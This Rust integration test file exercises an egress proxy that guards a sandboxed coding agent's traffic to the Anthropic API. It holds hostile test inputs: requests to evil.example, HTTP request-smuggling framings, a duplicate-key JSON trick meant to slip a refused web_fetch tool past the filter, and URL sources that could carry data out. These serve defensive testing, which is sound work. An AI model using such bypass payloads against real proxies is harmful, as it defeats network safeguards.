#![cfg(target_os = "linux")]
// ============================================================================
// The launcher-side egress proxy, end to end in CI (Phase 28.1, plan 01).
//
// Every test drives a real `EgressServer` over a real unix socket with raw
// HTTP/1 bytes, against an in-process plain-TCP stub standing in for
// `api.anthropic.com` (`Upstream::Plain`). There is no network and no bwrap.
// "The stub saw zero connections" is the assertion that matters for every
// refusal: a refused request must be decided before anything is dialled.
// ============================================================================

use std::io::{Read, Write};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::os::unix::fs::PermissionsExt;
use std::os::unix::net::{UnixListener, UnixStream};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;
use std::time::Duration;

use gsd_meta_manager::launcher::egress::upstream::Upstream;
use gsd_meta_manager::launcher::egress::{
    EgressHandle, EgressServer, EgressSpec, EgressStats, TokenProvider,
};
use tempfile::TempDir;

const REAL_TOKEN: &str = "REAL-TOKEN-SENTINEL";
const DUMMY_TOKEN: &str = "sk-ant-oat01-DUMMY-placeholder-not-a-real-token";

// ----------------------------------------------------------------- the stub

/// What the stub upstream received on one connection.
#[derive(Clone, Debug)]
struct Seen {
    head: String,
    body: Vec<u8>,
}

impl Seen {
    /// Every value of header `name` (case-insensitive), in order.
    fn header(&self, name: &str) -> Vec<String> {
        self.head
            .split("\r\n")
            .skip(1)
            .filter_map(|line| line.split_once(':'))
            .filter(|(n, _)| n.trim().eq_ignore_ascii_case(name))
            .map(|(_, v)| v.trim().to_owned())
            .collect()
    }

    fn request_line(&self) -> &str {
        self.head.split("\r\n").next().unwrap_or("")
    }
}

/// A stand-in for `api.anthropic.com`: records each request, answers `{}`.
struct Stub {
    addr: SocketAddr,
    seen: Arc<Mutex<Vec<Seen>>>,
    connections: Arc<AtomicUsize>,
    stop: Arc<AtomicBool>,
    thread: Option<JoinHandle<()>>,
}

impl Stub {
    fn start() -> Stub {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind the stub");
        listener.set_nonblocking(true).expect("nonblocking");
        let addr = listener.local_addr().expect("addr");
        let seen = Arc::new(Mutex::new(Vec::new()));
        let connections = Arc::new(AtomicUsize::new(0));
        let stop = Arc::new(AtomicBool::new(false));
        let (seen_t, connections_t, stop_t) = (
            Arc::clone(&seen),
            Arc::clone(&connections),
            Arc::clone(&stop),
        );
        let thread = std::thread::spawn(move || loop {
            match listener.accept() {
                Ok((stream, _)) => {
                    connections_t.fetch_add(1, Ordering::SeqCst);
                    let seen = Arc::clone(&seen_t);
                    std::thread::spawn(move || stub_connection(stream, &seen));
                }
                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    if stop_t.load(Ordering::SeqCst) {
                        break;
                    }
                    std::thread::sleep(Duration::from_millis(2));
                }
                Err(_) => break,
            }
        });
        Stub {
            addr,
            seen,
            connections,
            stop,
            thread: Some(thread),
        }
    }

    /// Connections the stub accepted, counted at accept time.
    fn connections(&self) -> usize {
        self.connections.load(Ordering::SeqCst)
    }

    fn seen(&self) -> Vec<Seen> {
        self.seen.lock().expect("lock").clone()
    }
}

impl Drop for Stub {
    fn drop(&mut self) {
        self.stop.store(true, Ordering::SeqCst);
        if let Some(thread) = self.thread.take() {
            let _ = thread.join();
        }
    }
}

fn stub_connection(mut stream: TcpStream, seen: &Mutex<Vec<Seen>>) {
    let _ = stream.set_nonblocking(false);
    let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
    let mut buf = Vec::new();
    let mut chunk = [0u8; 4096];
    let end = loop {
        if let Some(i) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
            break i + 4;
        }
        match stream.read(&mut chunk) {
            Ok(0) | Err(_) => return,
            Ok(n) => buf.extend_from_slice(&chunk[..n]),
        }
    };
    let head = String::from_utf8_lossy(&buf[..end]).into_owned();
    let length = head
        .split("\r\n")
        .filter_map(|l| l.split_once(':'))
        .find(|(n, _)| n.trim().eq_ignore_ascii_case("content-length"))
        .and_then(|(_, v)| v.trim().parse::<usize>().ok())
        .unwrap_or(0);
    while buf.len() < end + length {
        match stream.read(&mut chunk) {
            Ok(0) | Err(_) => return,
            Ok(n) => buf.extend_from_slice(&chunk[..n]),
        }
    }
    seen.lock().expect("lock").push(Seen {
        head,
        body: buf[end..end + length].to_vec(),
    });
    let _ =
        stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}");
}

// -------------------------------------------------------------- the server

/// A running egress server with its socket and a scratch directory.
struct Rig {
    /// Keeps the scratch directory (and so the socket path) alive.
    _dir: TempDir,
    sock: PathBuf,
    log: PathBuf,
    handle: Option<EgressHandle>,
}

impl Rig {
    fn start(upstream: SocketAddr, token: TokenProvider, allow_hosts: &[&str]) -> Rig {
        Rig::start_with(Upstream::Plain(upstream), token, allow_hosts)
    }

    fn start_with(upstream: Upstream, token: TokenProvider, allow_hosts: &[&str]) -> Rig {
        let dir = tempfile::Builder::new()
            .prefix("e")
            .tempdir_in("/tmp")
            .expect("a short temp dir");
        let sock = dir.path().join("egress.sock");
        let log = dir.path().join("egress.log");
        let listener = UnixListener::bind(&sock).expect("bind the egress socket");
        let handle = EgressServer::start(
            listener,
            EgressSpec {
                allow_hosts: allow_hosts.iter().map(|h| (*h).to_owned()).collect(),
                token,
                upstream,
                log_path: log.clone(),
            },
        )
        .expect("start the egress server");
        Rig {
            _dir: dir,
            sock,
            log,
            handle: Some(handle),
        }
    }

    fn with_static_token(stub: &Stub) -> Rig {
        Rig::start(stub.addr, TokenProvider::Static(REAL_TOKEN.to_owned()), &[])
    }

    /// Stop the server and return its counters.
    fn stop(mut self) -> EgressStats {
        self.handle.take().expect("running").stop()
    }

    /// The whole `egress.log` as text.
    fn log_text(&self) -> String {
        std::fs::read_to_string(&self.log).unwrap_or_default()
    }

    /// A client connection with a bounded read.
    fn connect(&self) -> UnixStream {
        let client = UnixStream::connect(&self.sock).expect("connect");
        client
            .set_read_timeout(Some(Duration::from_secs(10)))
            .expect("timeout");
        client
    }

    /// Send `raw` and read the whole response (the server closes after one).
    fn exchange(&self, raw: &[u8]) -> String {
        let mut client = UnixStream::connect(&self.sock).expect("connect");
        client
            .set_read_timeout(Some(Duration::from_secs(10)))
            .expect("timeout");
        client.write_all(raw).expect("write the request");
        let mut out = Vec::new();
        let _ = client.read_to_end(&mut out);
        String::from_utf8_lossy(&out).into_owned()
    }
}

/// `POST /v1/messages?beta=true` the way Claude Code sends it, plus the three
/// credentials the proxy must strip.
fn inference_request(path: &str, body: &str) -> Vec<u8> {
    format!(
        "POST {path} HTTP/1.1\r\n\
         host: localhost:3128\r\n\
         authorization: Bearer {DUMMY_TOKEN}\r\n\
         x-api-key: {DUMMY_TOKEN}\r\n\
         cookie: session={DUMMY_TOKEN}\r\n\
         anthropic-version: 2023-06-01\r\n\
         anthropic-beta: oauth-2025-04-20\r\n\
         x-stainless-os: Linux\r\n\
         user-agent: claude-cli/2.1.310 (external, sdk-cli)\r\n\
         content-type: application/json\r\n\
         content-length: {}\r\n\
         connection: keep-alive\r\n\r\n{body}",
        body.len()
    )
    .into_bytes()
}

fn status_line(response: &str) -> &str {
    response.split("\r\n").next().unwrap_or("")
}

// ------------------------------------------------------------------- tests

#[test]
fn an_inference_request_is_forwarded_with_the_real_token() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let body = r#"{"model":"m","messages":[],"tools":[{"name":"Bash","input_schema":{}}]}"#;

    let response = rig.exchange(&inference_request("/v1/messages?beta=true", body));

    assert!(
        status_line(&response).starts_with("HTTP/1.1 200"),
        "{response}"
    );
    assert!(response.ends_with("{}"), "{response}");
    let seen = stub.seen();
    assert_eq!(seen.len(), 1, "exactly one upstream request");
    let req = &seen[0];
    assert_eq!(req.request_line(), "POST /v1/messages?beta=true HTTP/1.1");
    assert_eq!(
        req.header("authorization"),
        [format!("Bearer {REAL_TOKEN}")],
        "exactly one Authorization, the real one"
    );
    assert!(req.header("x-api-key").is_empty(), "{}", req.head);
    assert!(req.header("cookie").is_empty(), "{}", req.head);
    assert_eq!(req.header("host"), ["api.anthropic.com"]);
    assert_eq!(req.header("connection"), ["close"]);
    assert_eq!(req.header("content-length"), [body.len().to_string()]);
    assert_eq!(req.header("anthropic-version"), ["2023-06-01"]);
    assert_eq!(req.header("anthropic-beta"), ["oauth-2025-04-20"]);
    assert_eq!(req.header("x-stainless-os"), ["Linux"]);
    assert_eq!(
        req.header("user-agent"),
        ["claude-cli/2.1.310 (external, sdk-cli)"]
    );
    assert!(
        !req.head.contains(DUMMY_TOKEN),
        "the client's credential reached the upstream: {}",
        req.head
    );
    assert_eq!(req.body, body.as_bytes());
}

#[test]
fn account_paths_are_refused_without_reaching_upstream() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    for target in [
        "/v1/code/sessions",
        "/v1/code/triggers",
        "/v1/mcp_servers?limit=1",
        "/v1/environments/bridge",
    ] {
        let raw = format!("GET {target} HTTP/1.1\r\nhost: x\r\nauthorization: Bearer d\r\n\r\n");
        let response = rig.exchange(raw.as_bytes());
        assert!(
            status_line(&response).starts_with("HTTP/1.1 403"),
            "{target}: {response}"
        );
        assert!(
            response.contains("permission_error"),
            "{target}: {response}"
        );
    }
    assert_eq!(stub.connections(), 0, "a refused request dialled upstream");
}

#[test]
fn absolute_form_targets_are_refused() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    for raw in [
        "POST http://api.anthropic.com/v1/messages HTTP/1.1\r\nhost: api.anthropic.com\r\ncontent-length: 2\r\n\r\n{}",
        "GET http://evil.example/x HTTP/1.1\r\nhost: evil.example\r\n\r\n",
    ] {
        let response = rig.exchange(raw.as_bytes());
        assert!(
            status_line(&response).starts_with("HTTP/1.1 403"),
            "{raw}: {response}"
        );
    }
    assert_eq!(stub.connections(), 0, "a refused request dialled upstream");
}

#[test]
fn count_tokens_is_forwarded() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let body = r#"{"model":"m","messages":[]}"#;

    let response = rig.exchange(&inference_request("/v1/messages/count_tokens", body));

    assert!(
        status_line(&response).starts_with("HTTP/1.1 200"),
        "{response}"
    );
    let seen = stub.seen();
    assert_eq!(seen.len(), 1);
    assert_eq!(
        seen[0].request_line(),
        "POST /v1/messages/count_tokens HTTP/1.1"
    );
    assert_eq!(
        seen[0].header("authorization"),
        [format!("Bearer {REAL_TOKEN}")]
    );
    assert_eq!(rig.stop().inference_forwarded, 1);
}

// ------------------------------------------------- task 2: body and framing

/// A request with an arbitrary header block and body, framed as the caller says.
fn raw_request(extra_headers: &[&str], body: &[u8]) -> Vec<u8> {
    let mut out = b"POST /v1/messages?beta=true HTTP/1.1\r\nhost: x\r\n".to_vec();
    for header in extra_headers {
        out.extend_from_slice(header.as_bytes());
        out.extend_from_slice(b"\r\n");
    }
    out.extend_from_slice(b"\r\n");
    out.extend_from_slice(body);
    out
}

fn with_length(body: &str) -> Vec<u8> {
    let length = format!("content-length: {}", body.len());
    raw_request(
        &[&length, "content-type: application/json"],
        body.as_bytes(),
    )
}

#[test]
fn server_side_fetch_bodies_are_refused() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let bodies = [
        r#"{"model":"m","messages":[],"mcp_servers":[]}"#,
        r#"{"model":"m","messages":[],"container":{"skills":[]}}"#,
        r#"{"model":"m","messages":[],"tools":[{"type":"web_fetch_20260318","name":"web_fetch"}]}"#,
        r#"{"model":"m","messages":[],"tools":[{"type":"code_execution_20260521","name":"code_execution"}]}"#,
        r#"{"model":"m","messages":[],"tools":[{"type":"advisor_20260301","name":"advisor"}]}"#,
        r#"{"model":"m","messages":[],"tools":[{"type":"mcp_toolset","mcp_server_name":"x"}]}"#,
        r#"{"model":"m","messages":[{"role":"user","content":[{"type":"tool_result","tool_use_id":"t","content":[{"type":"image","source":{"type":"url","url":"https://x.example/?d=1"}}]}]}]}"#,
        r#"{"model":"m","messages":[{"role":"user","content":[{"type":"document","source":{"type":"file","file_id":"file_01"}}]}]}"#,
        r#"{"model":"m","messages":[{"role":"user","content":[{"type":"container_upload","file_id":"file_01"}]}]}"#,
    ];
    for body in bodies {
        let response = rig.exchange(&with_length(body));
        assert!(
            status_line(&response).starts_with("HTTP/1.1 403"),
            "{body}: {response}"
        );
        assert!(
            !response.contains("x.example"),
            "a refusal must not echo a URL from the body: {response}"
        );
    }
    assert_eq!(stub.connections(), 0, "a refused body dialled upstream");
    assert_eq!(rig.stop().inference_denied, bodies.len() as u64);
}

/// 28.1-11 (WR-01 / T-28.1-02): serde_json keeps the LAST value of a repeated
/// key, but the proxy forwards the ORIGINAL bytes, so a body could carry a refused
/// field past the judge by repeating its key. A body that repeats any key is
/// refused instead, so the judged reading is the only reading.
#[test]
fn a_body_that_repeats_a_key_is_refused_before_upstream() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let bodies = [
        // The audit's repeated `tools`: a server tool first, an empty list last.
        r#"{"model":"m","messages":[],"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}],"tools":[]}"#,
        // The audit's repeated `source.type`: `url` first, `base64` last.
        r#"{"model":"m","messages":[{"role":"user","content":[{"type":"image","source":{"type":"url","type":"base64","url":"https://x.example/"}}]}]}"#,
        // Order control: the refused value last is denied today as well.
        r#"{"model":"m","messages":[],"tools":[],"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}]}"#,
        // The same key, the second spelling using the JSON escape `\u0073` for `s`.
        r#"{"model":"m","messages":[],"tools":[{"type":"web_fetch_20250910","name":"web_fetch"}],"tool\u0073":[]}"#,
    ];
    for body in bodies {
        let response = rig.exchange(&with_length(body));
        assert!(
            status_line(&response).starts_with("HTTP/1.1 403"),
            "{body}: {response}"
        );
        assert!(response.contains("permission_error"), "{body}: {response}");
        assert!(
            !response.contains("x.example") && !response.contains("web_fetch"),
            "a refusal must not echo a value from the body: {response}"
        );
    }
    assert_eq!(stub.connections(), 0, "a refused body dialled upstream");
    assert_eq!(rig.stop().inference_denied, bodies.len() as u64);
}

#[test]
fn web_search_and_client_tools_pass() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    for body in [
        r#"{"model":"m","messages":[],"tools":[{"name":"Bash","input_schema":{}}]}"#,
        r#"{"model":"m","messages":[],"tools":[{"name":"Bash","input_schema":{}},{"type":"web_search_20250305","name":"web_search","max_uses":5}]}"#,
        r#"{"model":"m","messages":[],"tools":[{"type":"custom","name":"x","input_schema":{}}],"container":null}"#,
    ] {
        let response = rig.exchange(&with_length(body));
        assert!(
            status_line(&response).starts_with("HTTP/1.1 200"),
            "{body}: {response}"
        );
    }
    assert_eq!(stub.seen().len(), 3);
}

#[test]
fn chunked_bodies_are_reframed_with_content_length() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let wire = raw_request(
        &[
            "transfer-encoding: chunked",
            "content-type: application/json",
        ],
        b"8;ext=1\r\n{\"model\"\r\n13\r\n:\"m\",\"messages\":[]}\r\n0\r\nX-Trailer: t\r\n\r\n",
    );

    let response = rig.exchange(&wire);

    assert!(
        status_line(&response).starts_with("HTTP/1.1 200"),
        "{response}"
    );
    let seen = stub.seen();
    assert_eq!(seen.len(), 1);
    let decoded = r#"{"model":"m","messages":[]}"#;
    assert_eq!(seen[0].body, decoded.as_bytes());
    assert_eq!(
        seen[0].header("content-length"),
        [decoded.len().to_string()]
    );
    assert!(
        seen[0].header("transfer-encoding").is_empty(),
        "{}",
        seen[0].head
    );
    assert!(seen[0].header("x-trailer").is_empty(), "{}", seen[0].head);
}

#[test]
fn encoded_or_ambiguous_framing_is_refused() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let body = r#"{"model":"m","messages":[]}"#;
    let length = format!("content-length: {}", body.len());
    let cases: Vec<(&str, Vec<u8>)> = vec![
        (
            "content-encoding: gzip",
            raw_request(&[&length, "content-encoding: gzip"], body.as_bytes()),
        ),
        (
            "both Content-Length and Transfer-Encoding",
            raw_request(&[&length, "transfer-encoding: chunked"], body.as_bytes()),
        ),
        (
            "duplicate Content-Length",
            raw_request(&[&length, &length], body.as_bytes()),
        ),
        (
            "upgrade",
            raw_request(&[&length, "upgrade: websocket"], body.as_bytes()),
        ),
        (
            "expect other than 100-continue",
            raw_request(&[&length, "expect: nope"], body.as_bytes()),
        ),
        ("malformed JSON", with_length("{\"model\": ")),
        ("not an object", with_length("[]")),
        ("empty body", raw_request(&[], b"")),
    ];
    for (name, wire) in &cases {
        let response = rig.exchange(wire);
        assert!(
            status_line(&response).starts_with("HTTP/1.1 4"),
            "{name}: {response}"
        );
    }
    assert_eq!(stub.connections(), 0, "a refused request dialled upstream");

    // The identity encoding is the one non-trivial header value that IS accepted.
    let wire = raw_request(&[&length, "content-encoding: identity"], body.as_bytes());
    let response = rig.exchange(&wire);
    assert!(
        status_line(&response).starts_with("HTTP/1.1 200"),
        "{response}"
    );
}

#[test]
fn oversized_bodies_are_refused_before_reading() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    // Only the head is sent: the 413 must not wait for a body that never comes.
    let wire = raw_request(&["content-length: 33554433"], b"");

    let response = rig.exchange(&wire);

    assert!(
        status_line(&response).starts_with("HTTP/1.1 413"),
        "{response}"
    );
    assert_eq!(stub.connections(), 0);
}

#[test]
fn expect_continue_is_answered_locally() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let body = r#"{"model":"m","messages":[]}"#;
    let head = raw_request(
        &[
            &format!("content-length: {}", body.len()),
            "expect: 100-continue",
        ],
        b"",
    );
    let mut client = rig.connect();
    client.write_all(&head).expect("write the head");

    // The interim response arrives before any body is sent, and before upstream.
    let mut interim = Vec::new();
    let mut byte = [0u8; 1];
    while !interim.ends_with(b"\r\n\r\n") {
        client
            .read_exact(&mut byte)
            .expect("read the interim response");
        interim.push(byte[0]);
    }
    assert_eq!(interim, b"HTTP/1.1 100 Continue\r\n\r\n");
    assert_eq!(stub.connections(), 0, "100 Continue came from upstream");

    client.write_all(body.as_bytes()).expect("write the body");
    let mut rest = Vec::new();
    let _ = client.read_to_end(&mut rest);
    let rest = String::from_utf8_lossy(&rest);
    assert!(status_line(&rest).starts_with("HTTP/1.1 200"), "{rest}");
    assert_eq!(stub.seen().len(), 1);
    assert!(stub.seen()[0].header("expect").is_empty());
}

// --------------------------------------------- task 3: CONNECT, log, host token

fn connect_request(authority: &str) -> Vec<u8> {
    format!("CONNECT {authority} HTTP/1.1\r\nhost: {authority}\r\nproxy-authorization: Basic eDp5\r\n\r\n")
        .into_bytes()
}

fn rig_with_allowlist(stub: &Stub, hosts: &[&str]) -> Rig {
    Rig::start(
        stub.addr,
        TokenProvider::Static(REAL_TOKEN.to_owned()),
        hosts,
    )
}

#[test]
fn connect_is_deny_by_default() {
    let stub = Stub::start();
    let rig = rig_with_allowlist(&stub, &[]);

    let response = rig.exchange(&connect_request("static.crates.io:443"));

    assert!(
        status_line(&response).starts_with("HTTP/1.1 403"),
        "{response}"
    );
    assert!(response.contains("allowlist"), "{response}");
    assert_eq!(stub.connections(), 0);
    let stats = rig.stop();
    assert_eq!((stats.connect_denied, stats.connect_allowed), (1, 0));
}

#[test]
fn connect_to_the_inference_host_is_refused_even_when_allowlisted() {
    let stub = Stub::start();
    let rig = rig_with_allowlist(&stub, &["api.anthropic.com"]);
    for authority in [
        "api.anthropic.com:443",
        "API.ANTHROPIC.COM:443",
        "api.anthropic.com.:443",
    ] {
        let response = rig.exchange(&connect_request(authority));
        assert!(
            status_line(&response).starts_with("HTTP/1.1 403"),
            "{authority}: {response}"
        );
        assert!(response.contains("inference"), "{authority}: {response}");
    }
    assert_eq!(stub.connections(), 0);
    assert_eq!(rig.stop().connect_denied, 3);
}

#[test]
fn an_allowlisted_name_resolving_to_loopback_is_refused() {
    let stub = Stub::start();
    let rig = rig_with_allowlist(&stub, &["localhost"]);

    let response = rig.exchange(&connect_request("localhost:443"));

    assert!(
        status_line(&response).starts_with("HTTP/1.1 403"),
        "{response}"
    );
    assert!(response.contains("loopback"), "{response}");
    assert!(
        !response.contains("127.0.0.1") && !response.contains("::1"),
        "the refusal named an address: {response}"
    );
    let log = rig.log_text();
    assert!(log.contains("loopback"), "{log}");
    assert!(!log.contains("127.0.0.1") && !log.contains("::1"), "{log}");
    assert_eq!(rig.stop().connect_denied, 1);
}

#[test]
fn ip_literals_and_non_443_ports_are_refused() {
    let stub = Stub::start();
    let rig = rig_with_allowlist(&stub, &["static.crates.io", "127.0.0.1", "1.2.3.4"]);
    for (authority, word) in [
        ("127.0.0.1:443", "IP literal"),
        ("1.2.3.4:443", "IP literal"),
        ("[::1]:443", "IP literal"),
        ("static.crates.io:80", "443"),
        ("static.crates.io:22", "443"),
        ("not-listed.example:443", "allowlist"),
    ] {
        let response = rig.exchange(&connect_request(authority));
        assert!(
            status_line(&response).starts_with("HTTP/1.1 403"),
            "{authority}: {response}"
        );
        assert!(response.contains(word), "{authority}: {response}");
    }
    assert_eq!(stub.connections(), 0);
    assert_eq!(rig.stop().connect_denied, 6);
}

#[test]
fn the_log_names_classes_never_headers_tokens_or_addresses() {
    let stub = Stub::start();
    let rig = rig_with_allowlist(&stub, &["localhost"]);
    // The authority a client typed is logged as typed; only a RESOLVED address is
    // withheld, so the batch carries no IP literal of its own.
    let secret_body =
        r#"{"model":"m","messages":[{"role":"user","content":"BODY-FIELD-SECRET-9137"}]}"#;

    let mut requests = 0usize;
    for wire in [
        inference_request("/v1/messages?beta=true&token=QUERY-SECRET-5521", secret_body).as_slice(),
        b"GET /v1/code/sessions?x=QUERY-SECRET-5521 HTTP/1.1\r\nhost: x\r\nx-api-key: HEADER-SECRET-7788\r\n\r\n",
        b"POST http://evil.example/x HTTP/1.1\r\nhost: evil.example\r\ncookie: HEADER-SECRET-7788\r\n\r\n",
        &connect_request("localhost:443"),
        &connect_request("example.org:443"),
        &connect_request("static.crates.io:80"),
    ] {
        let _ = rig.exchange(wire);
        requests += 1;
    }
    let denied_body = with_length(
        r#"{"messages":[],"tools":[{"type":"web_fetch_20260318","name":"BODY-FIELD-SECRET-9137"}]}"#,
    );
    let _ = rig.exchange(&denied_body);
    requests += 1;

    let log = rig.log_text();
    let mode = std::fs::metadata(&rig.log)
        .expect("the log exists")
        .permissions()
        .mode();
    assert_eq!(mode & 0o777, 0o600, "egress.log must be 0600");
    assert_eq!(
        log.lines().count(),
        requests,
        "one line per request:\n{log}"
    );
    for forbidden in [
        REAL_TOKEN,
        DUMMY_TOKEN,
        "Bearer",
        "bearer",
        "x-api-key",
        "X-Api-Key",
        "cookie",
        "HEADER-SECRET-7788",
        "BODY-FIELD-SECRET-9137",
        "QUERY-SECRET-5521",
        "127.0.0.1",
        "::1",
    ] {
        assert!(
            !log.contains(forbidden),
            "the log contains {forbidden:?}:\n{log}"
        );
    }
    for line in log.lines() {
        assert_eq!(line.split('|').count(), 6, "{line}");
    }
    assert!(log.contains("|inference|POST|/v1/messages|200|"), "{log}");
    assert!(
        log.contains("|connect|CONNECT localhost:443|-|403|"),
        "{log}"
    );
    assert!(log.contains("loopback"), "{log}");
    assert!(log.contains("|refused|"), "{log}");
}

#[test]
fn stop_reports_the_forwarded_count() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let body = r#"{"model":"m","messages":[]}"#;
    for _ in 0..3 {
        let response = rig.exchange(&inference_request("/v1/messages", body));
        assert!(
            status_line(&response).starts_with("HTTP/1.1 200"),
            "{response}"
        );
    }
    let _ = rig.exchange(&with_length(r#"{"messages":[],"mcp_servers":[]}"#));

    let stats = rig.stop();

    assert_eq!(stats.inference_forwarded, 3);
    assert_eq!(stats.inference_denied, 1);
    assert_eq!((stats.connect_allowed, stats.connect_denied), (0, 0));
}

/// Write a host credentials file whose access token is good for an hour.
fn write_credentials(dir: &std::path::Path, token: &str) {
    let expires = chrono::Utc::now() + chrono::Duration::hours(1);
    let doc = serde_json::json!({
        "claudeAiOauth": {
            "accessToken": token,
            "refreshToken": "REFRESH-TOKEN-NEVER-FORWARDED",
            "expiresAt": expires.timestamp_millis(),
        }
    });
    std::fs::write(dir.join(".credentials.json"), doc.to_string()).expect("write credentials");
}

#[test]
fn a_host_token_is_re_read_per_request_and_the_last_good_one_kept() {
    let stub = Stub::start();
    let claude_dir = tempfile::tempdir().expect("claude dir");
    write_credentials(claude_dir.path(), "HOST-TOKEN-ONE");
    let rig = Rig::start(
        stub.addr,
        TokenProvider::Host {
            claude_dir: claude_dir.path().to_path_buf(),
            initial: "HOST-TOKEN-INITIAL".to_owned(),
        },
        &[],
    );
    let body = r#"{"model":"m","messages":[]}"#;
    let send = || {
        let response = rig.exchange(&inference_request("/v1/messages", body));
        assert!(
            status_line(&response).starts_with("HTTP/1.1 200"),
            "{response}"
        );
        stub.seen()
            .last()
            .expect("a request")
            .header("authorization")
    };

    assert_eq!(send(), ["Bearer HOST-TOKEN-ONE"]);
    write_credentials(claude_dir.path(), "HOST-TOKEN-TWO");
    assert_eq!(
        send(),
        ["Bearer HOST-TOKEN-TWO"],
        "a rewritten token is picked up"
    );
    std::fs::write(claude_dir.path().join(".credentials.json"), "{ not json").expect("garble");
    assert_eq!(
        send(),
        ["Bearer HOST-TOKEN-TWO"],
        "a malformed file keeps the last good token"
    );
    std::fs::remove_file(claude_dir.path().join(".credentials.json")).expect("remove");
    assert_eq!(
        send(),
        ["Bearer HOST-TOKEN-TWO"],
        "a missing file keeps the last good token"
    );
    assert!(
        stub.seen()
            .iter()
            .all(|s| !s.head.contains("REFRESH-TOKEN")),
        "the refresh token must never reach the upstream"
    );
}

#[test]
fn a_host_token_falls_back_to_the_initial_one_when_the_file_never_parsed() {
    let stub = Stub::start();
    let claude_dir = tempfile::tempdir().expect("claude dir");
    let rig = Rig::start(
        stub.addr,
        TokenProvider::Host {
            claude_dir: claude_dir.path().to_path_buf(),
            initial: "HOST-TOKEN-INITIAL".to_owned(),
        },
        &[],
    );
    let response = rig.exchange(&inference_request("/v1/messages", r#"{"messages":[]}"#));
    assert!(
        status_line(&response).starts_with("HTTP/1.1 200"),
        "{response}"
    );
    assert_eq!(
        stub.seen()[0].header("authorization"),
        ["Bearer HOST-TOKEN-INITIAL"]
    );
}

#[test]
fn the_65th_connection_is_refused_while_64_are_open() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);
    let mut open: Vec<UnixStream> = (0..64).map(|_| rig.connect()).collect();

    // The 65th is turned away at once, with a response and not a hang.
    let mut sixty_fifth = rig.connect();
    let mut refusal = Vec::new();
    let _ = sixty_fifth.read_to_end(&mut refusal);
    let refusal = String::from_utf8_lossy(&refusal);
    assert!(
        status_line(&refusal).starts_with("HTTP/1.1 503"),
        "{refusal}"
    );
    assert!(
        refusal.to_ascii_lowercase().contains("connection: close"),
        "{refusal}"
    );

    // The 64 that are open keep working.
    let body = r#"{"model":"m","messages":[]}"#;
    let mut first = open.remove(0);
    first
        .write_all(&inference_request("/v1/messages", body))
        .expect("write on an open connection");
    let mut response = Vec::new();
    let _ = first.read_to_end(&mut response);
    assert!(
        String::from_utf8_lossy(&response).starts_with("HTTP/1.1 200"),
        "{}",
        String::from_utf8_lossy(&response)
    );

    // stop() returns while 63 connections are still open: no request outlives it.
    let started = std::time::Instant::now();
    let _ = rig.stop();
    assert!(
        started.elapsed() < Duration::from_secs(5),
        "stop() waited on open connections"
    );
    drop(open);
}

#[test]
fn a_client_that_disconnects_mid_body_ends_only_its_own_request() {
    let stub = Stub::start();
    let rig = Rig::with_static_token(&stub);

    // Mid-body: promises 100 bytes, sends 10, hangs up.
    {
        let mut quitter = rig.connect();
        quitter
            .write_all(&raw_request(&["content-length: 100"], b"0123456789"))
            .expect("write");
    }
    // Mid-response: sends a full request and hangs up without reading the answer.
    {
        let mut quitter = rig.connect();
        quitter
            .write_all(&inference_request("/v1/messages", r#"{"messages":[]}"#))
            .expect("write");
    }

    let body = r#"{"model":"m","messages":[]}"#;
    for _ in 0..3 {
        let response = rig.exchange(&inference_request("/v1/messages", body));
        assert!(
            status_line(&response).starts_with("HTTP/1.1 200"),
            "{response}"
        );
    }
}

// ------------------------------------------------------------- live (opt-in)

/// The one test that leaves the machine: it dials `api.anthropic.com:443` over
/// TLS through the real `Upstream::anthropic()` connector, with a bogus token, and
/// expects the API's own 401. It proves the rustls configuration (ring provider,
/// webpki roots, ALPN `http/1.1`) against the real host, which the plain-TCP stub
/// cannot. No credential of the user's is involved.
///
///   cargo test --test launcher_egress -- --ignored --nocapture
#[test]
#[ignore = "live: dials api.anthropic.com over TLS with a bogus token"]
fn the_tls_upstream_reaches_the_real_inference_host() {
    let rig = Rig::start_with(
        Upstream::anthropic(),
        TokenProvider::Static("sk-ant-oat01-BOGUS-live-tls-probe-not-a-real-token".to_owned()),
        &[],
    );
    let body = r#"{"model":"claude-haiku-4-5","max_tokens":1,"messages":[{"role":"user","content":"hi"}]}"#;

    let response = rig.exchange(&inference_request("/v1/messages", body));

    assert!(
        status_line(&response).starts_with("HTTP/1.1 401"),
        "expected the API's own 401 for a bogus token: {response}"
    );
    assert!(response.contains("authentication_error"), "{response}");
    assert_eq!(rig.stop().inference_forwarded, 1);
}
